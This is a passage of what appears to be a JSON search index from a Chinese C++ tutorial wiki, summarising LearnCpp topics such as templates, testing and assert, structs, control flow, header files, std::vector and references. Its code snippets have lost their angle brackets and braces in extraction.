type_traitstemplate typename Tstruct IsPointer : std::false_type ;template typename Tstruct IsPointerT* : std::true_type ;int main() std::cout IsPointerconst int*::value ; T 被推导为 const int，因此 T* 模式可以匹配指向 const 的对象；所有权语义仍不能从裸指针类型推断。 参考资料 LearnCpp 26.1：类模板 LearnCpp 26.2：模板非类型参数 LearnCpp 26.3：函数模板特化 LearnCpp 26.4：类模板特化 LearnCpp 26.5：类模板偏特化 LearnCpp 26.6：指针类型的偏特化 cppreference：模板与类相关条目","tags":[null,null]},{"title":"测试、覆盖率与断言边界","path":"/wiki/cpp/cpp-topic-testing-and-assertions.html","content":"测试通过只能说明选定输入得到了预期结果；覆盖率只能说明代码是否执行，不能证明断言是否充分。运行期 assert 适合检查程序内部不变量，static_assert 适合让类型和常量条件在编译期失败，它们都不能替代外部输入校验。 代码测试测试通过受控输入检查可观察行为，覆盖正常路径、边界值和错误路径。 测试只能证明已检查场景的行为，不能替代类型系统、断言、静态分析和代码审查。 测试用例由输入、执行操作和可验证结果组成。正常路径只覆盖契约的一部分，边界值、无效输入和状态迁移更容易暴露缺陷。测试通过证明的是这些用例在当前环境下符合预期，不等于穷尽程序的所有行为。 把测试写成可重复的断言 #include cassertint add(int left, int right) return left + right; int main() assert(add(2, 3) == 5); assert(add(-2, 2) == 0); 每个断言只验证一个可观察契约；测试数据不依赖系统时间或随机输出。 代码覆盖率语句、分支和条件覆盖率从不同角度衡量测试执行过哪些代码。 高覆盖率不等于高质量，断言是否验证正确结果以及边界是否合理更重要。 语句覆盖率说明某行执行过，分支覆盖率说明选择的不同出口执行过；二者都不评价断言是否正确，也不证明组合状态充分。覆盖率适合发现从未触达的区域，不适合作为单独的质量目标。 让测试覆盖每条分支 #include cassertint classify(int value) if (value 0) return -1; if (value == 0) return 0; return 1;int main() assert(classify(-1) == -1); assert(classify(0) == 0); assert(classify(1) == 1); 覆盖率只能说明执行过哪些路径，不能证明断言本身覆盖所有输入语义。 C++ 常见语义错误赋值与比较混淆、整数除法、边界偏移、悬空引用和错误生命周期都是常见语义错误。 警告、范围类型、容器边界检查和小型纯函数能把这类问题转为更早的诊断。 语义错误常表现为边界条件写反、单位混用、状态更新顺序错误或选择了不匹配的类型。这些程序可以正常编译。把需求约束写进类型、断言和针对边界的测试，才能在行为层面建立证据。 用测试暴露编译器看不出的错误 #include cassertint discount(int cents) return cents - 10; int main() // The test captures the business rule that a price cannot be negative. assert(discount(5) = 0); 程序可以成功编译，但业务不变量仍可能失败；测试应覆盖边界输入而不是只验证常规样本。 assert 与 static_assertassert 检查运行期内部不变量，并可能在 NDEBUG 构建中被移除。 static_assert 在编译期验证常量条件；任何具有副作用或用户输入校验的逻辑都不能依赖 assert。 assert 检查程序内部本应成立的不变量，发布构建可能通过 NDEBUG 移除，因此表达式不得含必要副作用。static_assert 在编译期检查类型和常量条件。用户输入、文件失败等可恢复情况不能只靠断言处理。 分别使用 assert 和 static_assert #include cassert#include iostreamconstexpr int slots4;static_assert(slots 0);int main() const int index2; assert(index slots); std::cout index ; static_assert 在编译期失败，assert 在运行期检查不变量；外部输入不应只依赖 assert。 调试器适合解释一次失败如何发生，可复现的程序缺陷则说明如何缩小范围；自动化测试负责把已经确认的行为长期固定下来。 参考资料 LearnCpp 9.1：代码测试 LearnCpp 9.2：代码覆盖率 LearnCpp 9.3：C++ 常见语义错误 LearnCpp 9.6：assert 与 static_assert cppreference：错误检测与处理相关条目","tags":[null,null]},{"title":"结构体、聚合初始化与成员访问","path":"/wiki/cpp/cpp-topic-structures.html","content":"结构体适合表示字段之间具有整体含义的数据。默认成员初始化提供缺省状态，聚合初始化按成员顺序构造对象，按值、引用和指针传递则分别表达复制或借用。成员访问语法很短，真正需要维护的是成员之间的不变量。 结构体、成员与成员选择struct 可以组合不同类型成员并通过点运算符访问，默认访问权限为 public。 成员共同表达一个完整数据概念时，结构体比并行变量更容易保持一致。 结构体成员共同描述一个对象状态，成员选择运算符访问具体字段。公开聚合适合没有隐藏不变量的简单数据；一旦某些字段组合必须同时满足条件，就应通过构造函数和操作封装修改路径，而不是让所有成员任意可写。 结构体成员和成员选择 #include iostreamstruct Coordinate int x; int y;;int main() Coordinate point2, 3; point.x = 5; std::cout point.x , point.y ; 点号运算符选择对象成员；结构体默认 public，适合表达透明的数据值。 结构体聚合初始化聚合可以按成员声明顺序使用花括号初始化，C++20 还支持有限的指定初始化器。 改变成员顺序会影响位置初始化和布局，公共数据格式不应直接依赖普通结构体内存表示。 聚合初始化按成员声明顺序提供初值，未显式提供的成员使用默认成员初始化器或值初始化。增加、删除或重排公开成员可能改变调用点含义，因此位置式花括号也是接口耦合。C++20 指定初始化器可以提高字段可见性，但仍要求声明顺序。 聚合初始化按成员顺序赋值 #include iostreamstruct Window int width; int height; bool visible; ;int main() const Window window800, 600, true; std::cout window.width x window.height ; 聚合初始化按声明顺序匹配成员；为成员增加构造函数后，类型是否仍是聚合需要重新检查。 默认成员初始化成员声明处的初始化器在构造函数没有显式初始化该成员时生效。 它适合建立一致默认状态，并减少多个构造函数重复相同初始化值。 默认成员初始化器在构造函数没有为该成员提供初始化时生效，让所有构造路径共享安全默认值。它不改变实际初始化顺序，顺序始终跟随成员声明。依赖另一个成员时，声明顺序必须与依赖方向一致。 默认成员初始化器提供默认状态 #include iostreamstruct Config int retries3; bool verbosefalse;;int main() const Config config; std::cout config.retries ; 没有构造函数显式覆盖时使用成员初始化器；构造函数初始化器拥有更高优先级。 结构体的传递与返回大型结构体只读传参通常使用 const 引用，小型值类型按值传递更清楚。 按值返回结构体可利用复制消除，并自然表达多个具名结果。 小型简单结构体按值传递能获得独立副本，较大只读对象可用 const 引用借用。返回结构体按值通常依赖复制消除或移动高效完成。接口选择应体现是否共享状态，而不是机械按成员数量决定。 结构体按值传递和返回 #include iostreamstruct Size int width; int height; ;Size doubled(Size value) return value.width * 2, value.height * 2; int main() const Size resultdoubled(3, 4); std::cout result.width x result.height ; 小型值类型适合按值传递和返回；大型对象可使用 const 引用避免复制。 结构体补充规则结构体可以包含成员函数、静态成员、类型别名和访问控制，语言能力与 class 基本相同。 惯例上 struct 用于公开数据或简单值类型，class 用于强调封装和不变量。 结构体可以拥有成员函数、构造函数和访问控制，与 class 的语言能力几乎相同，默认访问权限才是主要语法差异。项目通常用 struct 表示公开数据聚合，用 class 表示需要维护隐藏不变量的抽象，这是一种约定而非强制规则。 用比较和默认成员值保持结构体简单 #include iostreamstruct Version int major; int minor; auto operator=(const Version) const = default;;int main() std::cout (Version1, 2 Version2, 0) ; 结构体仍可以声明成员函数和默认比较；不变量复杂时应改成 class 并限制构造入口。 通过指针和引用选择成员对象使用点运算符，指针使用箭头运算符；引用仍使用点运算符。 operator- 可以被类重载并递归解析，智能指针因此能够提供类似裸指针的成员访问。 对象和引用使用 . 选择成员，指针使用 -，后者等价于先解引用再选择。成员指针是另一类独立语法，不是普通地址。任何指针成员访问前都必须确认对象存在且生命周期有效。 用 - 选择指针指向的成员 #include iostreamstruct Point int x; int y; ;int main() Point point2, 3; Point* pointerpoint; pointer-x = 5; std::cout pointer-x , pointer-y ; p-member 等价于 (*p).member；指针必须非空且仍指向有效对象。 参考资料 LearnCpp 13.7：结构体、成员与成员选择 LearnCpp 13.8：结构体聚合初始化 LearnCpp 13.9：默认成员初始化 LearnCpp 13.10：结构体的传递与返回 LearnCpp 13.11：结构体补充规则 LearnCpp 13.12：通过指针和引用选择成员 cppreference：复合类型：枚举与结构体相关条目","tags":[null,null]},{"title":"switch、循环与控制流转移","path":"/wiki/cpp/cpp-topic-switch-and-loops.html","content":"switch 适合按离散值选择路径，while、do while 和 for 分别强调条件、至少一次执行和计数式迭代。break 与 continue 只改变局部控制流，而 goto 和提前终止会跨越更大的结构边界，需要额外检查资源清理与可读性。 switch 基础switch 根据整型或枚举条件跳转到匹配 case，case 标签必须是可转换的常量表达式。 default 处理未列出的值；枚举分支是否保留 default 取决于是否希望编译器诊断新增枚举值。 switch 对整型或枚举条件进行一次求值，再跳到匹配 case。case 标签必须是常量表达式且不能重复。对 enum class 使用 switch 可以让编译器帮助检查未覆盖状态；default 分支是否存在应由未知值策略决定。 用 switch 表达离散状态 #include iostreamenum class State idle, running, failed ;int main() const State stateState::running; switch (state) case State::idle: std::cout idle ; break; case State::running: std::cout running ; break; case State::failed: std::cout failed ; break; 枚举状态在 case 中穷举；每个分支明确 break 或有意贯穿。 switch 贯穿与作用域case 末尾没有 break、return 或其他跳转时会继续执行后续 case。 有意贯穿使用 [[fallthrough]] 标注；跨 case 的局部初始化需要额外代码块限制作用域。 case 标签不会自动形成作用域，控制流默认继续执行后续 case。需要有意贯穿时使用 [[fallthrough]] 表达意图；否则以 break、return 或 throw 结束。case 内声明对象时加花括号，可以避免跳转跨过初始化并限制名称范围。 显式标记有意贯穿 #include iostreamint main() const int level2; switch (level) case 2: std::cout warm ; [[fallthrough]]; case 1: std::cout enabled ; break; default: break; [[fallthrough]] 记录有意贯穿；不需要共享操作时使用 break 避免状态继续流入下一分支。 goto 语句goto 只能跳到同一函数内的标签，并受对象初始化和生命周期规则限制。 普通业务流程优先使用循环、函数和提前返回；goto 仅在少数集中清理或生成代码中具有明确价值。 goto 只能跳到同一函数内的标签，且不能跳过需要初始化的自动对象进入其作用域。它偶尔用于底层 C 风格资源清理或生成代码，普通 C++ 控制流通常由提前返回、循环和 RAII 更清楚地表达。 清理路径中的 goto 边界 #include iostreamint main() bool okfalse; if (!ok) goto cleanup; std::cout work ;cleanup: std::cout cleanup ; goto 只能跳到同一函数中可达的标签；现代 C++ 通常用 RAII、循环和早返回表达清理路径。 循环与 while 语句while 在每轮开始前检查条件，适合迭代次数由运行期状态决定的循环。 循环体必须推进终止条件；状态更新散落在多个分支时容易形成无限循环。 while 在每次迭代前检查条件，适合迭代次数由运行状态决定的循环。循环体必须明确改变使条件最终失效的状态，也要考虑零次执行。读取输入时，把真实读取操作放进条件比预先检查 eof() 更准确。 while 循环由条件控制次数 #include iostreamint main() int value3; while (value 0) std::cout value ; --value; 循环体必须改变能影响条件的状态，否则循环不会终止。 do while 语句do while 在循环体之后检查条件，因此循环体至少执行一次。 它适合菜单或读取后验证等流程，但尾部条件与开头相距较远时可读性较差。 do while 先执行循环体再检查条件，因此至少运行一次。它适合菜单或“先尝试再决定是否重试”的流程，但条件位于末尾，循环体很长时容易被忽略。能够自然写成前置条件循环时，while 通常更直观。 至少执行一次的输入循环 #include iostreamint main() int choice; do std::cin choice; while (choice 1 || choice 3); std::cout choice ; do while 先执行循环体再判断条件，适合菜单等必须先展示或读取一次的场景。 for 语句for 把初始化、继续条件和迭代表达式集中在循环头部，适合计数或迭代器循环。 索引类型应与容器长度协调，反向循环尤其要避免无符号下溢。 for 把初始化、继续条件和每轮更新集中在循环头，适合计数或迭代器遍历。初始化区声明的对象只在整个循环范围内可见。下标遍历还要处理容器长度类型、空范围和反向循环的无符号下溢。 for 循环表达计数边界 #include iostreamint main() int total; for (int index; index 5; ++index) total += index; std::cout total ; 初始化、条件和迭代表达式集中在循环头；边界使用半开区间更容易与容器迭代配合。 break 与 continuebreak 终止最内层循环或 switch，continue 跳到下一轮循环检查。 多层循环需要跨层退出时，提取函数并 return 通常比标志变量或跳转更清楚。 break 退出最内层循环或 switch，continue 跳到下一次循环条件或更新步骤。它们适合提前处理异常元素，但多个分散出口会削弱循环不变量。嵌套循环需要退出多层时，提取函数并返回通常比状态标志更清楚。 用 break 和 continue 表达循环路径 #include iostreamint main() for (int value1; value = 10; ++value) if (value % 2 == 0) continue; if (value 7) break; std::cout value ; continue 进入下一轮，break 结束整个循环；两个跳转点都应保持在当前循环的局部语义内。 程序提前终止return 正常离开函数，std::exit 结束程序但不会析构当前栈上的自动对象，std::abort 表示异常终止。 资源清理依赖 RAII 时应优先正常展开调用栈；库代码通常不应擅自终止整个进程。 从 main 正常返回会销毁自动对象并把状态交给宿主；std::exit 不展开当前调用栈，std::abort 则异常终止。库代码不应随意结束整个进程，应返回错误或抛出异常，让应用边界决定退出策略。 明确提前终止的原因 #include cstdlib#include iostreamint main() const bool fatal_errorfalse; if (fatal_error) return EXIT_FAILURE; std::cout continue ; return、std::exit 和 std::terminate 的清理语义不同；通常优先从 main 返回状态。 参考资料 LearnCpp 8.5：switch 基础 LearnCpp 8.6：switch 贯穿与作用域 LearnCpp 8.7：goto 语句 LearnCpp 8.8：循环与 while 语句 LearnCpp 8.9：do while 语句 LearnCpp 8.10：for 语句 LearnCpp 8.11：break 与 continue LearnCpp 8.12：程序提前终止 cppreference：控制流相关条目","tags":[null,null]},{"title":"多文件程序、头文件与预处理边界","path":"/wiki/cpp/cpp-topic-translation-units.html","content":"源文件增多后，问题从“这段代码能否编译”变成“声明由谁提供、定义出现几次、名称在哪个作用域中可见”。预处理器只负责文本层面的展开；编译器分别处理每个翻译单元；链接器最后解析跨文件符号。 多源文件程序每个源文件独立预处理和编译为翻译单元，链接器再解析跨文件符号。 公共声明放入头文件，实现放入源文件；不要通过包含 cpp 文件复用实现。 预处理后的每个源文件形成一个翻译单元。编译器分别检查它们，链接器最后把外部符号对应起来；这解释了为什么声明错误常在编译期出现，而缺少定义或重复定义常在链接期出现。头文件提供共享声明，源文件提供非内联定义。 以头文件连接多个翻译单元 // math_utils.hpp#pragma onceint square(int value);// math_utils.cpp#include math_utils.hppint square(int value) return value * value; // main.cpp#include iostream#include math_utils.hppint main() std::cout square(6) ; 三个文件应分别编译再链接；头文件只放共享声明，不能通过包含 .cpp 文件复用实现。 头文件只声明公共接口 // price.h#pragma onceint total_cents(int quantity, int unit_price_cents);// price.cpp#include price.hint total_cents(int quantity, int unit_price_cents) return quantity * unit_price_cents; 调用方包含声明，定义只在一个源文件出现；实际构建必须同时编译并链接对应源文件。 头文件保持自包含，源文件只提供一个外部定义，构建系统显式列出全部翻译单元；不要通过包含 .cpp 文件共享实现。 名称冲突与命名空间命名空间把名称组织到独立作用域中，限定名可以明确指出实体来源。 头文件中的 using 指令会污染所有包含者的名称查找，应使用限定名或局部 using 声明。 命名空间把名称放入可限定作用域，解决的是名称组织与查找，不是访问控制。使用 std::cout 这类限定名能直接说明来源；局部 using 声明可以减少重复。头文件中的 using 指令会改变所有包含者的候选集合，应避免。 用限定名消除名称冲突 #include iostreamnamespace metrics int count() return 3; namespace cache int count() return 7; int main() std::cout metrics::count() cache::count() ; 限定名把调用绑定到明确命名空间；公共头文件不应使用 using namespace 污染包含者。 预处理器预处理器在编译前处理 include、宏和条件编译，输出结果才形成编译器看到的翻译单元。 宏缺少类型和作用域规则，常量、内联函数、模板与 constexpr 通常提供更安全的替代。 预处理器操作的是记号文本，不理解 C++ 类型和作用域。对象式宏可能重复求值、污染名称或产生难以定位的诊断；常量优先使用 constexpr，小操作使用函数或模板，条件编译只保留确实依赖平台或构建配置的分支。 用条件编译隔离平台分支 #include iostreamint main()#if defined(_WIN32) std::cout windows ;#else std::cout other ;#endif 预处理器在编译前选择文本分支；只对平台或构建开关使用它，普通常量和函数优先使用语言机制。 头文件头文件保存需要被多个翻译单元共享的声明、模板和内联定义。 头文件应自包含并直接包含自己使用的依赖，不能依赖包含顺序或其他文件的传递包含。 头文件是翻译单元之间共享声明的接口文件，应直接包含自己使用的类型依赖并能单独被包含。实现细节可通过源文件或前向声明减少耦合，但不能依赖某个调用方碰巧先包含另一头文件。模板定义通常必须在实例化点可见。 头文件直接包含自己的依赖 // counter.hpp#pragma once#include cstddefclass Counterpublic: std::size_t value() const return m_value; private: std::size_t m_value;; 头文件自包含后，包含顺序不会改变声明是否可见；模板和 inline 定义通常也要放在头文件中。 头文件保护包含保护宏阻止同一头文件在一个翻译单元中重复展开，避免重复定义。 #pragma once 得到主流编译器支持但不属于 C++ 标准；可移植库通常仍可使用唯一的 include guard。 包含保护解决的是同一头文件在一个翻译单元内被重复展开，不替代单一定义规则。宏名称需要在项目范围内唯一。#pragma once 使用简洁且被主流工具链支持，但它不是 C++ 标准指令；要求面对特殊文件系统或陌生工具链的可移植库仍可选择传统 guard。 使用唯一的包含保护 #ifndef APP_COUNTER_HPP#define APP_COUNTER_HPPstruct Counter int value; ;#endif 同一翻译单元第二次展开该头文件时宏已经定义，从而避免重复定义；宏名应足够唯一。 这套边界也解释了从源文件到可执行文件中的许多链接错误：头文件解决可见性，源文件提供定义，构建配置决定哪些翻译单元真正参与链接。 参考资料 LearnCpp 2.8：多源文件程序 LearnCpp 2.9：名称冲突与命名空间 LearnCpp 2.10：预处理器 LearnCpp 2.11：头文件 LearnCpp 2.12：头文件保护 cppreference：函数与文件相关条目","tags":[null,null]},{"title":"数组遍历、范围 for 与枚举索引","path":"/wiki/cpp/cpp-topic-vector-iteration.html","content":"遍历只读取元素时，范围 for 能直接表达整个范围；需要位置、相邻元素或多个序列同步推进时，下标和迭代器仍然必要。索引的符号性、容器长度和枚举底层值必须保持一致，才能避免越界与隐式转换。 数组与循环索引循环适合需要位置的算法，范围 for 适合只关心元素的顺序遍历。 缓存长度前要确认循环体不会改变容器大小；修改结构可能同时使迭代器和引用失效。 遍历数组时，边界来自容器自身而不是手写常量。只需元素时使用范围 for，需要位置时再引入索引；循环中修改容器大小会使边界和迭代器失效，必须依照具体容器规则重新设计操作顺序。 遍历容器的实际范围 #include iostream#include vectorint main() std::vector values2, 4, 6; for (int value : values) value *= 2; for (int value : values) std::cout value ; 范围 for 使用容器的 beginend；需要修改元素时迭代变量必须是非 const 引用。 数组循环的符号性处理容器长度与索引类型不一致会产生比较警告或转换风险。 可以使用 std::size_t 正向索引、std::ssize 配合有符号索引，或直接使用范围 for迭代器。 容器长度常用无符号类型，循环计数若需要表达负值或差值，可使用迭代器差值类型与 std::ssize。不要在 index = 0 的无符号反向循环中等待条件变假；迭代器反向范围或明确的 index-- 0 更安全。 反向遍历使用有符号长度 #include iostream#include iterator#include vectorint main() const std::vector values2, 4, 6; for (auto indexstd::ssize(values); index-- 0;) std::cout values[static_caststd::size_t(index)] ; std::ssize 自 C++20 返回有符号长度，避免 size_t 在零以下回绕。 范围 for 循环范围 for 通过 beginend 遍历元素，auto 避免复制并允许修改，const auto 提供只读借用。 遍历期间改变容器结构可能使隐藏的迭代器失效；按值循环则不会修改原元素。 范围 for 会先保存范围表达式，再通过 begin 和 end 迭代。元素声明使用 const auto 可只读借用，auto 可原地修改，auto 则复制元素。遍历临时范围内部的子对象时仍要注意其所有者生命周期。 范围 for 的值与引用语义 #include iostream#include vectorint main() std::vector values1, 2, 3; for (auto value : values) ++value; for (const auto value : values) std::cout value ; auto 修改原元素，按值变量只是副本；迭代期间不能执行使当前迭代器失效的重分配。 使用枚举作为数组索引与长度枚举可以为逻辑位置命名，末尾计数枚举器可用于固定数组长度。 enum class 需要显式转换为索引；新增枚举器时应同步检查数组初始化和遍历范围。 枚举可以为数组槽位命名，末尾 count 枚举项常用于计算长度，但它仍可能被显式转换为无效整数。访问函数应集中完成底层值转换和范围检查。公开枚举新增项还会改变固定数组布局与序列化约定。 枚举索引与哨兵长度 #include array#include cstddef#include iostreamenum class Metric requests, errors, count ;int main() std::arrayint, static_caststd::size_t(Metric::count) values; values[static_caststd::size_t(Metric::errors)] = 2; std::cout values[1] ; count 哨兵给出数组长度，访问时显式转换为 size_t；枚举顺序改变时数组语义也随之改变。 参考资料 LearnCpp 16.6：数组与循环 LearnCpp 16.7：数组循环的符号性处理 LearnCpp 16.8：范围 for 循环 LearnCpp 16.9：使用枚举作为数组索引与长度 cppreference：动态数组：std::vector相关条目","tags":[null,null]},{"title":"std::vector 的所有权、构造与接口传递","path":"/wiki/cpp/cpp-topic-vector-model.html","content":"std::vector 是多数动态连续序列的默认选择。它拥有元素存储，长度在运行期变化；列表构造与数量构造含义不同，下标使用无符号大小类型，接口传递则需要区分读取范围、修改容器和转移所有权。 容器与数组容器拥有一组同类型元素并提供长度、遍历和生命周期管理，数组强调连续索引序列。 选择容器时应比较所有权、长度是否固定、迭代器稳定性和插入删除复杂度。 容器拥有一组元素，并定义存储、访问、增长和迭代器失效规则。连续存储的 vector 适合大多数动态序列，固定长度可用 array，其他容器应由插入位置、查找复杂度和地址稳定性需求驱动，而不是只看接口是否相似。 容器统一管理元素范围 #include array#include iostream#include vectorint main() const std::array fixed1, 2, 3; const std::vector dynamic4, 5; std::cout fixed.size() + dynamic.size() ; array 的长度是类型的一部分，vector 的长度在运行期变化；二者都提供 size 和迭代器边界。 std::vector 与列表构造std::vector 提供连续动态存储，花括号列表通常表示元素值，圆括号构造可表示元素数量。 单个整数在两种构造语法下含义不同，接口处应明确想创建一个值还是指定长度。 vector 的花括号通常选择 initializer_list 构造，因此 5, 0 表示两个元素，而 (5, 0) 表示五个零。元素数量和元素值必须从初始化形式明确区分。需要预分配但不创建元素时使用 reserve，而不是 resize 或数量构造。 vector 列表构造与数量构造 #include iostream#include vectorint main() const std::vector listed3, 3; const std::vectorint repeated(3, 3); std::cout listed.size() repeated.size() ; 花括号优先匹配 initializer_list，圆括号 (count, value) 构造重复元素；两种写法含义不同。 vector 的无符号长度与下标问题vector::size 返回无符号 size_type，错误减法和反向循环可能下溢。 C++20 std::ssize 返回有符号长度；访问前仍需检查索引范围。 vector 下标类型是无符号 size_type，operator[] 不检查边界，at() 越界时抛出异常。外部索引先验证非负与上界，再转换为 size_type。反向循环使用迭代器、范围适配或 std::ssize 可避免 size()-1 下溢。 使用 size_t 和检查访问 #include iostream#include vectorint main() const std::vector values2, 4, 6; for (std::size_t index; index values.size(); ++index) std::cout values.at(index) ; size 返回无符号 size_type，at 执行边界检查；需要反向差值时可使用 std::ssize 和有符号类型。 传递 std::vector只读借用通常使用 const std::vector，需要修改元素时使用非常量引用。 只依赖连续范围的函数可接受 std::span，从而同时支持 vector、array 和 C 风格数组。 只读取元素序列且不需要 vector 特有操作时，C++20 std::spanconst T 能接收多种连续容器；需要修改容量或调用 vector 成员时才接收 vectorT。按值参数表示函数取得副本或所有权，应在接口中有明确目的。 借用 vector 而不复制 #include iostream#include vectorint sum(const std::vectorint values) int result; for (int value : values) result += value; return result;int main() std::cout sum(2, 4, 6) ; const 引用保留容器所有权并避免复制；只需连续视图时也可以接受 std::span。 按用途选择 vector 接口形式 int sum(std::spanconst int values); // 只读借用void normalize(std::vectorint values); // 修改现有容器std::vectorint load_values(Input input); // 返回新所有者 三个签名分别表达只读范围、可修改容器和所有权转移，避免一个裸指针接口承担全部含义。 spanconst T 表达只读连续范围，vectorT 表达需要容器能力的修改接口；不要为了省写一个类型而丢失所有权和边界含义。 返回 vector 与移动语义按值返回局部 vector 可以利用复制消除或移动语义转移缓冲区所有权。 不要返回局部 vector 的引用，也通常不要对 return value 显式 std::move，以免阻止复制消除。 返回局部 vector 的值是安全且常见的所有权传递，复制消除或移动会转移内部存储。不要为了“避免复制”返回局部引用，也通常不要显式 std::move(local)，后者可能阻碍命名返回值优化。 按值返回 vector #include iostream#include vectorstd::vectorint even_numbers(int limit) std::vectorint result; for (int value; value = limit; value += 2) result.push_back(value); return result;int main() std::cout even_numbers(6).size() ; 返回值通过复制消除或移动高效交付所有权；不能返回局部 vector 的引用。 按用途选择 vector 接口形式 int sum(std::spanconst int values); // 只读借用void normalize(std::vectorint values); // 修改现有容器std::vectorint load_values(Input input); // 返回新所有者 三个签名分别表达只读范围、可修改容器和所有权转移，避免一个裸指针接口承担全部含义。 按值返回容器能直接转移所有权，复制消除和移动语义会避免不必要的深复制；不要返回局部容器的引用。 参考资料 LearnCpp 16.1：容器与数组 LearnCpp 16.2：std::vector 与列表构造 LearnCpp 16.3：vector 的无符号长度与下标问题 LearnCpp 16.4：传递 std::vector LearnCpp 16.5：返回 vector 与移动语义 cppreference：动态数组：std::vector相关条目","tags":[null,null]},{"title":"值类别、左值引用与参数借用","path":"/wiki/cpp/cpp-topic-values-and-references.html","content":"引用语法背后是表达式和值类别规则。左值通常表示具有身份的对象，右值常表示临时结果；普通左值引用允许修改，const 左值引用可以绑定更广的表达式。作为参数时，引用表达的是借用关系，而不是所有权转移。 复合数据类型复合类型由其他类型构造，包括引用、指针、数组、函数、枚举、类和联合。 组合方式会改变别名关系、所有权、可空性和内存布局，需要分别分析。 复合类型由基本类型或其他类型构造，包括数组、函数、指针、引用、类和枚举。它们不仅改变存储形状，也改变复制、生命周期和接口语义。后续选择引用或指针时，应先判断是否拥有对象、能否为空以及访问持续多久。 选择合适的复合类型 #include iostream#include stringstruct User int id; std::string name; ;int main() User user7, Ada; std::cout user.id user.name ; 结构体把多个相关对象组合成一个值；引用、指针和数组还会额外引入借用或布局规则。 值类别：lvalue 与 rvalue值类别描述表达式如何标识对象以及能否用于移动等操作，现代 C++ 完整分类还包括 xvalue、prvalue 和 glvalue。 值类别属于表达式而非变量类型；具名 rvalue 引用表达式本身仍是 lvalue。 值类别描述表达式如何标识对象以及资源能否被复用，不描述对象存放在栈还是堆。具名对象表达式通常是左值，临时结果通常是纯右值；std::move 也不移动数据，它只是把表达式转换为可供移动重载选择的右值类别。 区分左值和右值表达式 #include iostream#include utilityvoid inspect(int) std::cout lvalue ; void inspect(int) std::cout rvalue ; int main() int value3; inspect(value); inspect(std::move(value)); 具名变量表达式是左值，即使其声明类型为 T；std::move 只改变值类别。 左值引用T 必须绑定到兼容的左值并作为原对象别名，引用自身不能重新绑定。 被引用对象必须在引用使用期间保持存活，引用不会自动延长普通局部对象生命周期。 左值引用必须在声明时绑定，之后对引用赋值会修改被引用对象而不是改绑。引用通常应始终代表有效对象，因此不能表示可选关系；需要“可能没有对象”或稍后重新指向时，指针或 optionalreference_wrapperT 更准确。 引用为现有对象提供别名 #include iostreamint main() int value3; int aliasvalue; alias = 4; std::cout value ; alias 不创建新对象；引用初始化后不能改为绑定另一个对象。 const 左值引用const T 可以绑定 const 对象、非 const 对象和临时值，并禁止通过该引用修改对象。 绑定临时值时通常会把临时对象生命周期延长到该引用的生命周期，但成员和返回场景存在额外规则。 const T 可以绑定左值，也可以绑定转换结果或临时对象；在直接绑定临时时，临时生命周期可延长到该引用作用域结束。这个规则不会沿函数返回或成员引用任意传递，因此把引用保存到更长生命周期对象中仍需单独审查。 const 引用借用而不修改 #include iostreamvoid print(const int value) std::cout value ; int main() print(4); const 左值引用可以绑定左值和临时值，但不能通过它修改目标。 按左值引用传参按 T 传参表达调用方必须提供可修改对象，函数对形参的修改会作用于实参。 只有确实需要输出或原地修改时才使用非常量引用，并用清晰命名说明修改结果。 T 形参明确表示函数会访问调用方现有对象，并可能修改它。它不会表达可空，也不会转移所有权。若修改只是实现细节而非接口结果，按值计算后返回新值通常更容易组合；确实需要原地更新时，名称和返回值应让副作用可见。 非 const 引用参数表达输出修改 #include iostreamvoid normalize(int value) if (value 0) value = 0;int main() int value-2; normalize(value); std::cout value ; 调用方传入的对象会被修改；如果接口不需要写入权限，改用 const 引用或按值。 按 const 左值引用传参const T 避免复制大型对象并接受左值和临时值，是只读借用的常见形式。 对 int、指针等小型可复制类型，按值通常更简单且可能更高效。 const T 避免复制并禁止通过该引用修改对象，适合借用大对象。对 int、迭代器和 string_view 等小型值，按值往往更简单。性能规则不能脱离类型大小、调用频率和编译器优化，接口语义仍是首要依据。 大对象按 const 引用借用 #include iostream#include stringvoid print_length(const std::string value) std::cout value.size() ;int main() print_length(sample); const 引用避免不必要复制并保留只读契约；临时 string 在完整表达式结束前保持有效。 参考资料 LearnCpp 12.1：复合数据类型 LearnCpp 12.2：值类别：lvalue 与 rvalue LearnCpp 12.3：左值引用 LearnCpp 12.4：const 左值引用 LearnCpp 12.5：按左值引用传参 LearnCpp 12.6：按 const 左值引用传参 cppreference：复合类型：引用与指针相关条目","tags":[null,null]},{"title":"Java学习","path":"/wiki/java/index.html","content":"Java 基础、集合、并发、Web、JDBC、Spring 与项目实践整理。"},{"title":"vector 的容量、迭代器失效与特殊表示","path":"/wiki/cpp/cpp-topic-vector-storage.html","content":"size() 是当前元素数量，capacity() 是不重新分配时可容纳的元素数量。reserve() 只能减少一段时间内的增长分配，不能提供永久地址稳定性。vectorbool 还使用特殊压缩表示，其元素访问不返回普通 bool。 概念索引 主题 规则边界 vector 的 resize 与 capacity size 是已构造元素数量，capacity 是无需重新分配即可容纳的元素数量。 vector 的栈式操作 push_backemplace_back 在尾部添加，back 访问尾元素，pop_back 删除尾元素。 std::vector vector 是按位压缩特化，operator[] 返回代理而不是 bool。 vector 的 resize 与 capacityreserve 只调整容量请求，resize 会创建或销毁元素；重分配会使所有元素指针、引用和迭代器失效。 size() 是已经构造的元素数量，capacity() 是无需重新分配即可容纳的数量。reserve() 只改变容量，不能让下标访问新增位置合法；resize() 才会创建或销毁元素。发生重新分配后，指向原元素的指针、引用和迭代器都会失效。 区分 size、capacity 与 reserve #include iostream#include vectorint main() std::vectorint values; values.reserve(8); values.resize(3, 7); std::cout values.size() values.capacity() ; reserve 只预留存储不创建元素，resize 改变元素数量；扩容会使已有指针、引用和迭代器失效。 按用途选择 vector 接口形式 int sum(std::spanconst int values); // 只读借用void normalize(std::vectorint values); // 修改现有容器std::vectorint load_values(Input input); // 返回新所有者 三个签名分别表达只读范围、可修改容器和所有权转移，避免一个裸指针接口承担全部含义。 预留容量只能减少增长过程中的重分配次数，不能把迭代器永久变成稳定地址；任何可能增长容器的操作后都要重新判断失效。 vector 的栈式操作back 和 pop_back 要求容器非空；vector 作为栈时不会限制调用方访问中间元素。 push_backemplace_back、back 和 pop_back 让 vector 提供栈式尾部操作。pop_back 不返回元素，通常先移动或读取 back() 再弹出；空容器上调用二者没有定义，因此接口边界必须先检查。需要明确栈抽象时可使用 std::stack 适配器。 vector 的栈式操作 #include iostream#include vectorint main() std::vectorint stack; stack.push_back(3); stack.push_back(5); std::cout stack.back() ; stack.pop_back(); back 和 pop_back 要求容器非空；需要受限接口和特定语义时可以使用 std::stack。 